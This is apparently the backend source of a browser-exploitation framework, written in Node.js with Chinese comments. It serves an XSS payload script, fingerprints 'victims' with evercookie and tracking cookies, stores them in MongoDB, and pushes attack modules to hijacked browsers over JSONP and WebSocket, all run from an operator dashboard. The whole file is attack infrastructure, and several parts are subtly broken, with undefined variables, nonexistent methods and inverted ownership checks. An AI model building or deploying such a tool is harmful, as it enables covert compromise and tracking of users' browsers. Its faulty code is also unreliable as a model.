var express = require('express'),
    session = require('express-session'),
    cookieParser = require('cookie-parser'),
    bodyParser = require('body-parser'),
    evercookie = require('evercookie'),
    mongoose = require('mongoose'),
    logger = require('morgan'),
    crypto = require('crypto'),
    csrf = require('csurf'),
    ejs = require('ejs'),
    fs = require('fs'),
    app = express(),
    server = require('http').createServer(app),
    expressWs = require('express-ws')(app, server);

//   数据库
var sql = require('./models');
mongoose.connect(sql.Db);

//   模板引擎
app.set('view engine', 'ejs');
app.engine('html', ejs.renderFile);

//   其它
app.use(logger());
app.use(cookieParser());
app.use(evercookie.backend());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded());
app.use(session({
    secret:'session'
}));
app.use('/home', csrf());
function err404(req, res, next){
    //  定义404页面
    return res.send(404, '( ・_・)');
};
app.use('/static', express.static(__dirname+'/static'));
app.use('/home', function(req, res, next){
    //  后台防护
    if(!req.session.user){return err404(req, res, next)};
    res.locals.token = req.csrfToken();
    res.header('X-Frame-Options', 'DENY');
    next();
});
function getmd5(str){
    //  如其名
    return crypto.createHash('md5').update(str).digest('hex');
}

app.all('/', function(req, res){
    //  返回XSSJS 框架
    res.header('Content-Type', 'application/javascript');
    return res.render('bungeegum', {
        domain:req.header('host'),
        id:req.query.i
    });
});
app.all('/i/', function(req, res){
    //  返回模块
    //  TODO who id use "Canvas Fingerprinting"
    var id = req.param('i');
    var who = req.cookies.who;
    sql.Victim.findOne({who:who}, function(err, info){
        if(info){
            return res.jsonp(info.load);
        };
        //  若数据库内无Victim，则创建之
        sql.Item.findById(id, function(err, info){
            if(!info){
                return err404(req, res);
            };
            who = getmd5(info.owner+id+Date.now());
            res.cookie('who', who);
            //  继承item的配置
            sql.Victim.create({
                owner:info.owner,
                who:who,
                name:info.name+Date.now(),
                payload:info.payload,
                modules:info.modules,
                status:{},
                now:Date.now()
            }, function(){
                return res.jsonp(info.load);
            });
        });
    });
});
function handle(re, modules, owner, victim, who, type){
    //  处理服务端模块
    var share = {};
    modules.forEach(function(n){
        var m = require('./'+n[0]);
        if(m.type!=type){return null};
        if(typeof share[n[0]] != 'object'){
            share[n[0]] = [];
        };
        share[n[0]].unshift(m(
            re,
            owner,
            n[1],
            victim,
            who,
            share
        ));
    });
};
function httppage(req, res){
    //  HTTP页面
    var pageid = req.params.uri;
    var who = req.cookies.who;
//    if(!who){return null};
    online(who, Date.now());
    sql.Page.findOne({uri:pageid}, function(err, info){
        if(!info||info.type != 'http'){
            return err404(req, res);
        };
        var owner = req.session.user&&(req.session.user.name == info.owner);
        handle({q:req, s:res}, info.modules, owner, sql.Victim, who, 'http');
    });
};
function online(who, on){
    //  是否在线？
    sql.Victim.findOne({who:who}, function(err, info){
        info&&sql.Victim.update({who:who}, {
            now:on
        }, function(err, info){
            sql.Victim.seva();
        });
    });
};
function wspage(ws, req){
    // WebSocket页面
    var pageid = req.params.uri;
    var who = req.cookies.who;
//    if(!who){return null};
    sql.Page.findOne({uri:pageid}, function(err, info){
        var page = info;
        if(!info||info.type != 'ws'){
            return err404(req, res);
        };
        ws.on('open', function(){
            if(owner){return null};
            online(who, 'online');
        });
        ws.on('close', function(){
            if(owner){return null};
            online(who, Date.now());
        });
        ws.on('message', function(msg){
            var owner = req.session.user&&(req.session.user.name == info.owner);
            handle({q:req, s:ws}, info.modules, owner, sql.Victim, who, 'ws');
        });
    });
};
app.all('/h/:uri', httppage);
app.ws('/h/:uri', wspage);
app.all('/home/page/:uri', httppage);
app.ws('/home/page/:uri', wspage);

//   用户相关
app.route('/login')
    .get(function(req, res){
        return res.render('login', {err:''});
    })
    .post(function(req, res){
        var name = req.body.name;
        var passwd = req.body.passwd;
        sql.User.findOne({name:name}, function(err, info){
            if(!info){return res.render('login', {err:'login failed.'})};
            sql.User.findOne({
                name:name,
                passwd:getmd5(passwd+info.salt)
            }, function(err, info){
                if(!info){return res.render('login', {err:'login failed.'})};
                req.session.user = info;
                return res.redirect('/home');
            });
        });
    });
app.post('/home/logout', function(req, res){
    req.session.user = null;
    return res.redirect('/login');
});

// 用户页面
app.get('/home', function(req, res){
    var victim, page;
    sql.Victim.find({owner:req.session.user.name}, function(err, info){
        victims = info;
        sql.Page.find({owner:req.session.user.name}, function(err, info){
            pages = info;
            sql.Item.find({owner:req.session.user.name}, function(err, info){
                items = info;
                return res.render('home', {
                    items:items,
                    victims:victims,
                    pages:pages
                });
            });
        });
    });
});

app.get('/home/item/:name', function(req, res){
    sql.Item.findOne({id:req.params.name}, function(err, info){
        if(!info||info.owner == req.session.user.name){
            return err404(req, res);
        };
        return res.render('edit', {
            items:info
        });
    });
});
app.get('/home/victim/:name', function(req, res){
    sql.Victim.findOne({id:req.params.name}, function(err, info){
        if(!info||info.owner == req.session.user.name){
            return err404(req, res);
        };
        return res.render('edit', {
            victims:info
        });
    });
});
app.get('/home/page/:uri/edit', function(req, res){
    sql.Page.findOne({uri:req.params.uri}, function(err, info){
        if(!info||info.owner == req.session.user.name){
            return err404(req, res);
        };
        return res.render('editpage', {
            pages:info
        });
    });
});

app.post('/home/victim/:id/edit', function(req, res){
    var id = req.params.id;
    if(req.param('type')=='delete'){
        sql.Victim.findByIdAndRemove(id, function(err){
            return res.json({error:err});
        });
    }else{
        sql.Victim.findByIdUpdate(id, {
            owner:req.body.owner,
            name:req.body.name,
            payload:req.body.payload,
            load:JSON.parse(req.body.load),
            modules:JSON.parse(req.body.modules),
            status:JSON.parse(req.body.modules),
        }, function(err, info){
            return res.json({error:(err||info?'':'not found.')});
        });
    };
});
app.post('/home/page/:uri/edit', function(req, res){
    var id = req.params.id;
    if(req.param('type')=='delete'){
        sql.Page.findByIdAndRemove(id, function(err){
            return res.json({error:err});
        });
    }else{
        sql.Page.findByIdUpdate(id, {
            owner:req.body.owner,
            name:req.body.name,
            uri:req.body.uri,
            type:req.body.type,
            modules:JSON.parse(req.body.modules)
        }, function(err, info){
            return res.json({error:(err||info?'':'not found.')});
        });
    };
});

app.all('/home/modules', function(req, res){
    var type = req.param('type');
    var json = {};
    if(type=='user'){
        //TODO
    }else if(type=='server'){
        fs.readdirSync('./modules').forEach(function(n){
            var m = require('./modules/'+n);
            json[m.name] = {
                name:m.name,
                author:m.author,
                description:m.description,
                type:m.type,
                params:m.params
            }
        });
        return res.json(json);
    }else if(type=='victim'){
        //TODO
    }else{
        return err404(req, res);
    };
});

app.use('*', err404);
app.listen(process.env.OPENSHIFT_NODEJS_PORT || 8080,
    process.env.OPENSHIFT_NODEJS_IP);
